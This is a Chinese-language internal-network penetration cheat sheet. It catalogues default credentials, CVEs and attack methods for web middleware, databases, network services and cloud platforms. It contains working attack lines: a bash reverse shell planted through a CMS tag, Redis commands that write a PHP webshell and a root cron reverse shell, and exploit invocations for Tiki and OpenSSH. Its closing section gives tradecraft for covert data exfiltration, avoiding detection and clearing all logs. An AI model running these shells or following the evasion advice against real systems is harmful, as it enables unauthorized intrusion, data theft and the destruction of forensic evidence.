常规思路
========================================

内网安全检查
----------------------------------------

攻击思路
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 攻击外网服务器，获取外网服务器的权限，接着利用入侵成功的外网服务器作为跳板，攻击内网其他服务器，最后获得敏感数据，并将数据传递到攻击者，看情况安装长期后门，实现长期控制和获得敏感数据的方式；
- 攻击办公网的系统、办公网电脑、办公网无线等方式，一般是采用社工，实现控制办公电脑，再用获得的办公网数据，可能是内网的各种登录账号和密码，再获取办公网或者生产网的有用数据。

敏感资料/数据/信息
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 高管/系统管理员/财务/人事/业务人员的个人电脑
- 文件服务器/共享服务器
- 邮件服务器
- OA服务器
- 数据库服务器

攻击过程
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 信息收集
- 漏洞验证/漏洞攻击
- 后渗透
- 日志清理

信息收集
----------------------------------------
- 主机发现
- 端口扫描
- 漏洞扫描
- 识别内网环境
	+ 办公网
	+ 生产网

漏洞验证/漏洞攻击
----------------------------------------

Web
----------------------------------------

自定义 Web 应用
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Web 中间件
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Tomcat
	+ 端口号：8080
	+ 攻击方法
		- 默认口令、弱口令，爆破，tomcat5 默认有两个角色：tomcat和role1。其中账号both、tomcat、role1的默认密码都是tomcat。弱口令一般存在5以下的版本中。
		- 在管理后台部署 war 后门文件
		- 远程代码执行漏洞
	+ 常见漏洞
		- CVE-2016-8735
		- CVE-2017-12615
- Jboss
	+ 端口：8080
	+ 攻击方法
		- 弱口令，爆破
		- 管理后台部署 war 后门
		- 反序列化
		- 远程代码执行
	+ 常见漏洞
		- CVE-2015-7501
		- CVE-2017-7504
		- CVE-2017-12149
- WebLogic
	+ 端口：7001，7002
	+ 攻击方法
		+ 弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic
		+ 管理后台部署 war 后门
		+ SSRF
		+ 反序列化漏洞
		+ weblogic_uac
	+ 常见漏洞
		- CVE-2019-2725
		- CVE-2019-2729
		- CVE-2018-3191
		- CVE-2018-2628
		- CVE-2018-2893
		- CVE-2018-2894
		- CVE-2017-3506
		- CVE-2017-10271
		- CVE-2017-3248
		- CVE-2016-0638
		- CVE-2016-3510
		- CVE-2015-4852
		- CVE-2014-4210
- WebSphere
	+ 端口：默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090
	+ 攻击方法
		+ 控制台登录爆破
		+ 很多内网 websphere 的控制台存在弱口令 / 默认口令，可以使用 admin/admin 以及 webshpere/webshpere 这种口令登录。 通过该口令登录控制台后，可以部署 war 包，从而获取到 WEBSHELL 。
		+ 反序列化
		+ 任意文件泄露
		
Web 框架
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Struts2
	+ 可利用漏洞
		+ S2-048
		+ S2-052
		+ S2-053
		+ S2-057
		+ S2-046 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10
		+ S2-045 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10
		+ S2-037 CVE-2016-4438 Struts 2.3.20-2.3.28.1
		+ S2-032 CVE-2016-3081 Struts 2.3.18-2.3.28
		+ S2-020 CVE-2014-0094 Struts 2.0.0-2.3.16
		+ S2-019 CVE-2013-4316 Struts 2.0.0-2.3.15.1
		+ S2-016 CVE-2013-2251 Struts 2.0.0-2.3.15
		+ S2-013 CVE-2013-1966 Struts 2.0.0-2.3.1
		+ S2-009 CVE-2011-3923 Struts 2.0.0-2.3.1.1
		+ S2-005 CVE-2010-1870 Struts 2.0.0-2.1.8.1
	+ 扫描工具
		+ https://github.com/x51/STS2G/releases
		+ ``ST2SG --mode scan --url http://xxx.com/index.action``
- Spring 框架
	+ 可利用漏洞
		+ CVE-2010-1622
		+ CVE-2018-1274
		+ CVE-2018-1270
		+ CVE-2018-1273
		+ 反序列化
		+ 目录穿越
		
Web 服务器
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- IIS：Windows 的 WWW 服务器
	+ https://masterxsec.github.io/2017/06/07/IIS-write-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/
	+ http://www.freebuf.com/articles/4908.html
	+ https://www.anquanke.com/post/id/85811
	+ IIS，开启了 WebDAV，可以直接详服务器 PUT 文件
	+ 短文件名枚举漏洞
	+ 远程代码执行
	+ 提权漏洞
	+ 解析漏洞
- Apache 
	+ 解析漏洞
	+ 目录遍历
- Nginx 
	+ https://www.seebug.org/vuldb/ssvid-92538
	+ 解析漏洞
	+ 目录遍历
	+ CVE-2016-1247：需要获取主机操作权限，攻击者可通过软链接任意文件来替换日志文件，从而实现提权以获取服务器的root权限
- lighttpd
	+ 目录遍历

常见运维系统
----------------------------------------
一般分自动化部署和运维监控相关的的工具。漏洞可以通过搜索引擎搜索，github搜索，ExploitDB搜索，官网上的安全通告获取。
内网的通用类应用比较常见的问题是弱口令，如果一个管理员可以登录几个系统，那在这几个系统的账号、密码也基本上是一样的。

宝塔
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
通过一个交互界面就能完成服务器的维护工作，比如更新系统，添加网站，修改设置等等。可以搭建任何开源建站程序，包括主流的WordPress，帝国CMS,织梦程序等，也可以搭建Java开源的建站程序，例如OneBlog程序。

Gitlab
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- GitLab是一个利用 Ruby on Rails 开发的开源应用程序，实现一个自托管的项目仓库，可通过Web界面进行访问公开的或者私人项目。
- 可利用漏洞
	+ 任意文件读取漏洞
	+ 任意用户 token 泄露漏洞
	+ 命令执行漏洞
	
Jenkins
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Jenkins是一种跨平台的持续集成和交付的应用软件，它便于不断稳定地交付新的软件版本，并提高你的工作效率。这款开发运维工具还让开发人员更容易把项目的变化整合起来，并使用大量的测试和部署技术。
- 可利用漏洞：
	+ 远程代码执行漏洞
	+ 反序列化漏洞
	+ 未授权访问漏洞
	+ 登录入口爆破
- 常见漏洞
	+ CVE-2018-1999002

Puppet
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Puppet Enterprise专门管理基础设施即代码(IAC)，在这种类型的IT基础设施配置过程中，系统用代码而不是脚本流程来自动构建、管理和配置。由于它是代码，整个过程易于重复。Puppet有助于更容易控制版本、自动化测试和持续交付，可以更快速地响应问题或错误。
- 可利用漏洞，很少公开的POC
- 反序列化
- 远程命令执行

Ansible
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Ansible是一种配置和管理工具，面向客户端的软件部署和配置，支持Unix、Linux和Windows。它使 用JSON和YAML，而不是IAC，根本不需要节点代理就可以安装。它可以通过OpenStack在内部系统上使用，也可以在亚马逊EC2上使用。
- 可利用漏洞
	+ 远程代码执行
	
Nagios
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Nagios是一款开源的电脑系统和网络监视工具，能有效监控Windows、Linux和Unix的主机状态，交换机路由器等网络设置，打印机等。在系统或服务状态异常时发出邮件或短信报警第一时间通知网站运维人员，在状态恢复后发出正常的邮件或短信通知。
- 可利用漏洞
	+ 代码执行
	+ SQLi
	
Zabbix
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Zabbix 是一款强大的开源分布式监控系统, 能够将SNMP、JMX、Zabbix Agent提供的数据通过WEB GUI的方式进行展示。
- 可利用漏洞
	+ 远程代码执行
	+ SQLi
	+ shell 命令注入
	+ 认证绕过
	+ 默认账户与密码，默认口令 admin/zabbix，或者是guest/空
	
Cacit
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Cacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具。
- 可利用漏洞
	+ 任意代码执行
	+ SQLi
	+ 登录爆破
	+ 默认密码admin/admin
	
Splunk
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Splunk Enterprise 可以从任何来源监控和分析机器数据，以提供操作智能，从而优化您的 IT、安全和业务绩效。Splunk Enterprise 具有直观的分析功能、机器学习、打包应用程序和开放式 API，是一个灵活的平台，可从重点用例扩展到企业范围的分析主干。
- 可利用漏洞
	+ 信息泄露
	+ 命令注入
	+ 服务端请求伪造

常见Web应用
----------------------------------------

邮件系统
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
一部分是使用腾讯企业邮箱、阿里企业邮箱的，很难有可利用的漏洞，另外一种是能独立部署的邮件系统，政企常用的邮箱应用：

- Coremail
- 亿邮
- 35互联
- TurboMail
- Exchange
- IBM Lotus

CMS应用
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- thinkphp
	+ 漏扫工具
		- https://github.com/Lucifer1993/TPscan
		- https://github.com/theLSA/tp5-getshell

- wordpress
	+ 扫描插件和主题是否包含漏洞
	+ 拿到wp网站登录用户名和密码
		- 可通过上传主题文件来getshell，首先先去官网下载一个主题压缩包，之后将反弹shell的php代码写入shell.php中，然后将其放入压缩包一起上传
		- shell目录：/wp-content/themes/[主题名]/[shell文件名]
		- 通过主题编辑修改php页面
	+ xmlrpc.php
		- 查看支持的方案
		
		::
		
			POST /xmlrpc.php HTTP/1.1
			Host: 192.168.100.106
			User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
			Content-Type: text/xml;charset=UTF-8
			Content-Length: 128

			<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>

- CMS Made Simple
	+ 数据库更改密码方法
		- 前提：登录数据库
		- ``update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name='sitemask'),''),'admin'))) where username = 'admin';``
	+ 反弹shell
		- 前提：登录系统
		- Extensions/User Defined Tags
			::
				
				vps开启监听
				修改任何一个tag的code，点击apply，点击run
				echo system("bash -c 'bash -i >& /dev/tcp/192.168.100.108/4444 0>&1'");
			
- tiki
	+ CVE-2020-15906
		- 利用条件：tiki<21.2
		- 免密码登录
			::
			
				https://www.exploit-db.com/exploits/48927
				python 48927.py 192.168.100.103
				打开burpsuite，开启拦截
				浏览器登录admin，输入密码
				bp去掉密码，forward
				
		- 命令执行
			::
			
				https://srcincite.io/pocs/cve-2021-26119.py.txt
				python cve-2021-26119.py 192.168.100.103 /tiki/ whoami

数据库/缓存/消息服务
----------------------------------------

MySQL数据库
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 默认端口：3306
- 攻击方法
	+ 爆破：弱口令
	+ 身份认证漏洞：CVE-2012-2122
	+ 拒绝服务攻击
	+ Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意
	+ 提权
	
MSSQL数据库
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）
- 攻击方法：
	+ 爆破：弱口令/使用系统用户
	+ 注入
	
Oracle数据库
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）
- 攻击方法：
	+ 爆破：弱口令
	+ 注入攻击
	+ 漏洞攻击

PostgreSQL数据库
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 默认端口：5432
- 攻击方法
	+ 爆破：弱口令：postgres postgres
	+ 缓冲区溢出：CVE-2014-2669
	
MongoDB数据库
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 默认端口：27017
- 攻击方法
	+ 爆破：弱口令
	+ 未授权访问；github有攻击代码；
	
Redis数据库
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 默认端口：6379
- 攻击方法
	+ 爆破：弱口令
	+ 未授权访问+配合ssh key提权
- 工具和命令
	+ 连接：``redis-cli -h 172.16.143.1 -p 6379``
	+ 查看所有的keys：``keys *``
	+ 写入文件
		::
		
			CONFIG GET dir
			CONFIG SET dir /usr/share/apache/htdocs/
			SET shell "<?php echo system($_REQUEST[cmd])?>"
			CONFIG SET dbfilename shell.php
			save
	+ 反弹shell
		::
		
			C2服务器监听：nc -lvnp 7999
			
			注意：先查看一下原来的dir，dbfilename是什么，进行备份。
			redis服务器执行以下redis命令：
			set xx "\n* * * * * bash -i >& /dev/tcp/192.168.32.144/7999 0>&1\n"
			config set dir /var/spool/cron/
			config set dbfilename root
			save

SysBase数据库
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 默认端口：服务端口5000；监听端口4100；备份端口：4200
- 攻击方法：
	+ 爆破：弱口令
	+ 命令注入
	
DB2 数据库
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 默认端口：5000
- 攻击方法
	+ 安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）

常见服务/协议
----------------------------------------

FTP 服务
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
FTP服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；

- 默认端口：20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）
- 攻击方式
	+ 爆破：ftp的爆破工具有很多，这里我推荐owasp的Bruter 以及msf中ftp爆破模块；
	+ 匿名访问：用户名：anonymous 密码：为空或任意邮箱
	+ 嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）
	+ 后门 vsftp
	+ 远程溢出
	+ 跳转攻击
	
NFS 服务
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。

- 攻击方法
	+ 未授权访问
	
Samba服务
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Samba是linux和unix系统上实现SMB/CIFS协议的一个免费软件，由服务器和客户端程序构成。而SMB是局域网支持共享文件和打印机的一种通信协议，为局域网内不同计算机之间提供文件及打印机等资源的共享服务。

- 攻击方法
	+ 远程代码执行
	+ 弱口令
	+ 未授权访问（public）

SSH服务
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SSH是协议，通常使用OpenSSH软件实现协议应用。

- 端口：22
- 攻击方法
	+ 爆破
	+ 后门
	+ 漏洞：28退格漏洞、OpenSSL漏洞
- 常见漏洞
	+ CVE-2018-15473
		- OpenSSH 7.7前存在一个用户名枚举漏洞，通过该漏洞，攻击者可以判断某个用户名是否存在于目标主机。
		- auxiliary(scanner/ssh/ssh_enumusers
		- https://github.com/Rhynorater/CVE-2018-15473-Exploit.git
		- ``python sshUsernameEnumExploit.py --port 22 --userList /home/kali/Downloads/rockyou.txt 192.168.100.103``
- 命令
	+ 公钥登录: ``ssh -i id_rsa root@142.93.198.56``


Telnet服务
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。

- 默认端口：21
- 攻击方法
	+ 爆破
	+ 嗅探

Windows远程连接
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 默认端口：3389
- 攻击方法
	+ 爆破
	+ Shift粘滞键后门：5次shift后门
	+ 利用ms12-020攻击3389端口
	
VNC服务
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
VNC（Virtual Network Computing），为一种使用RFB协议的显示屏画面分享及远程操作软件。此软件借由网络，可发送键盘与鼠标的动作及即时的显示屏画面。

- 默认端口：5900+桌面ID（5901；5902）
- 攻击方式：
	+ 爆破：弱口令
	+ 认证口令绕过：
	+ 拒绝服务攻击：（CVE-2015-5239）
	+ 权限提升：（CVE-2013-6886）
	
SMTP协议
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！

- 默认端口：25（smtp）、465（smtps）
- 攻击方式
	+ 爆破：弱口令
	+ 未授权访问
	
POP3协议
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 默认端口：109（POP2）、110（POP3）、995（POP3S）
- 攻击方式：
	+ 爆破；弱口令
	+ 未授权访问

DNS服务
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 默认端口：53
- 攻击方式：
	+ 区域传输漏洞
	
IMAP协议
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 默认端口：143（imap）、993（imaps）
- 攻击方式：
	+ 爆破：弱口令
	+ 配置不当
	
SNMP协议
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 默认端口：161
- 攻击方式
	+ 爆破：弱口令
	
DHCP服务
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 默认端口：67&68、546（DHCP Failover做双机热备的）
- 攻击方式：
	+ DHCP劫持
	
云环境
----------------------------------------

VMware
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
使用 VMware vCloud 可将现有数据中心内的虚拟基础架构资源池化，并将其作为基于目录的服务交付。通过与云计算基础架构的最佳平台 VMware vSphere 配合使用，VMware vCloud Director 可为客户提供构建安全的私有云，从而改变 IT 部门交付和管理基础架构服务以及用户访问和使用这些服务的方式。

一般组织中很多独立安装的 Esxi 形式的私有云，或独立部署的虚拟化系统。

- 漏洞
	+ 主机逃逸
	+ CVE-2017-5638
	
OpenStack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
OpenStack是基础设施即服务（IaaS）软件，让任何人都可以自行创建和提供云计算服务。此外，OpenStack也用作创建防火墙内的“私有云”（Private Cloud），提供机构或企业内各部门共享资源。

- 漏洞，有漏洞但是POC基本没有。检查时候可以参考安全的配置实践。
	+ 权限绕过漏洞
	+ 信息泄露
	+ 代码执行漏洞
	
Docker
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制[1]。

Docker利用Linux核心中的资源分脱机制，例如cgroups，以及Linux核心名字空间（name space），来创建独立的软件容器（containers）。这可以在单一Linux实体下运作，避免引导一个虚拟机造成的额外负担。

Linux核心对名字空间的支持完全隔离了工作环境中应用程序的视野，包括进程树、网络、用户ID与挂载文件系统，而核心的cgroup提供资源隔离，包括CPU、内存、block I/O与网络。

从0.9版本起，Dockers在使用抽象虚拟是经由libvirt的LXC与systemd - nspawn提供界面的基础上，开始包括libcontainer函数库做为以自己的方式开始直接使用由Linux核心提供的虚拟化的设施。

- 安全问题（很少有漏洞的POC，安全检查也是基于最佳实践和官方安全建议进行）
	+ CVE-2015-3630 1.6.0 Docker Libcontainer 安全绕过漏洞
	+ CVE-2015-3627 1.6.1 Libcontainer和Docker Engine 权限许可和访问控制漏洞
	+ CVE-2015-3630 1.6.1 Docker Engine 安全绕过漏洞
	+ CVE-2014-9358 1.3.3 Docker 目录遍历漏洞
	+ CVE-2014-9357 1.3.2 Docker 权限许可和访问控制漏洞
	+ CVE-2014-6408 1.3.1 Docker 权限许可和访问控制漏洞
	+ CVE-2014-5277 1.3.0 Docker和docker-py 代码注入漏洞
	+ 内核漏洞（Kernel exploits） 容器是基于内核的虚拟化，主机（host）和主机上的所有容器共享一套内核。如果某个容器的操作造成了内核崩溃，那么反过来整台机器上的容器都会受到影响。
	+ 拒绝服务攻击（Denial-of-service attacks） 所有的容器都共享了内核资源，如果一个容器独占了某一个资源（内存、CPU、各种ID），可能会造成其他容器因为资源匮乏无法工作（形成DoS攻击）。
	+ 容器突破（Container breakouts） Linux的namespace机制是容器的核心之一，它允许容器内部拥有一个PID=1的进程而在容器外部这个进程号又是不一样的（比如1234）。现在问题在于如果一个PID=1的进程突破了namespace的限制，那么他将会在主机上获得root权限。
	+ 有毒镜像（Poisoned images） 主要是考虑到镜像本身的安全性，没太多好说的。
	
大数据
----------------------------------------

Elsaticsearch
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Elasticsearch 是一个分布式的搜索和分析引擎，可以用于全文检索、结构化检索和分析，并能将这三者结合起来。Elasticsearch 基于 Lucene 开发，现在是使用最广的开源搜索引擎之一，Wikipedia、Stack Overflow、GitHub 等都基于 Elasticsearch 来构建他们的搜索引擎。

- 默认端口：9200、9300
- 攻击方法：
	+ 未授权访问；
	+ 远程命令执行；
	+ 文件遍历；
	+ 低版本webshell植入；
	
hadoop
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Hadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。

Hadoop=HDFS（文件系统，数据存储技术相关）+ Mapreduce（数据处理），Hadoop的数据来源可以是任何形式，在处理半结构化和非结构化数据上与关系型数据库相比有更好的性能，具有更灵活的处理能力，不管任何数据形式最终会转化为key/value，key/value是基本数据单元。

用函数式变成Mapreduce代替SQL，SQL是查询语句，而Mapreduce则是使用脚本和代码，而对于适用于关系型数据库，习惯SQL的Hadoop有开源工具hive代替。 Hadoop就是一个分布式计算的解决方案。

Hive
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Hive是Hadoop家族中一款数据仓库产品，Hive最大的特点就是提供了类SQL的语法，封装了底层的MapReduce过程，让有SQL基础的业务人员，也可以直接利用Hadoop进行大数据的操作。

Sqoop
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Apache Sqoop（SQL-to-Hadoop） 项目旨在协助 RDBMS 与 Hadoop 之间进行高效的大数据交流。

用户可以在 Sqoop 的帮助下，轻松地把关系型数据库的数据导入到 Hadoop 与其相关的系统 (如HBase和Hive)中；同时也可以把数据从 Hadoop 系统里抽取并导出到关系型数据库里。除了这些主要的功能外，Sqoop 也提供了一些诸如查看数据库表等实用的小工具。

HBase
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HBase建立在HDFS之上，提供高可靠性、高性能、列存储、可伸缩、实时读写的数据库系统。

它介于NoSQL和RDBMS之间，仅能通过行键(row key)和行键序列来检索数据，仅支持单行事务(可通过Hive支持来实现多表联合等复杂操作)。主要用来存储非结构化和半结构化的松散数据。

与Hadoop一样，HBase目标主要依靠横向扩展，通过不断增加廉价的商用服务器，来增加计算和存储能力。

Spark
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Spark是UC Berkeley AMP lab所开源的类Hadoop MapReduce的通用的并行计算框架，Spark基于map reduce算法实现的分布式计算，拥有Hadoop MapReduce所具有的优点；但不同于MapReduce的是Job中间输出和结果可以保存在内存中，从而不再需要读写HDFS。


后渗透
----------------------------------------

提权
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- https://github.com/SecWiki/windows-kernel-exploits
- https://github.com/SecWiki/linux-kernel-exploits

域攻击
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 确定目标系统和应用程序
- 识别潜在的漏洞
- 利用漏洞获得初始访问
- 提升权限
- 定位域管理进程或者获取远程系统上的本地身份验证令牌
- 通过本地管理员的密码Hash，破解密码，使用mimikatz工具抓取密码验证运行在远程系统上的域名管理进程
- 迁移域管理进程
- 创建一个域管理员

建立后门/端口转发
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- LCX：windows下面的端口转发软件。
- sockscap：主要针对windows平台的端口转发和代理转发。
- proxifier：跨平台的端口转发和代理工具，适用windows，linux，
- Macos平台，代理转发利器
- Rsscoks：＊nix平台下的端口转发和代理工具，配合proxychains好用到不行。
- Proxychains：＊nix平台下老牌的socks代理工具，一般的系统都会自带，谁用谁知道。
- ssh proxy：通过ssh做端口代理和转发，一般＊nix系统都自带。
- netcat：socat，hping，在很多情况下可以做端口转发和数据代理转发。
- metasploit：metasploit的后渗透模块中有不少代理模块和端口转发模块

传输文件
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

制作后门/木马程序
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

日志清理
----------------------------------------

注意事项
----------------------------------------
- 检查内网监控防范系统
- 谨慎使用ARP软件和大面积扫描软件
- 使用目标网络中无空闲机器，作为打包对象
- 使用内网大流量机器作为传输对象，如wsus服务器、视频会议系统
- 使用临时机器打包、数据传输，不要使用已控机器，可利用wmi脚本或wmic远程操作
- 禁止使用psexec.exe
- 打包时避开用户工作时间
- 控制卷包大小<100M
- 选择用户常用压缩软件
- 错峰下载数据
- 控制传输流量
- 清除所有操作日志
- 登录主机前先看看管理员是否在
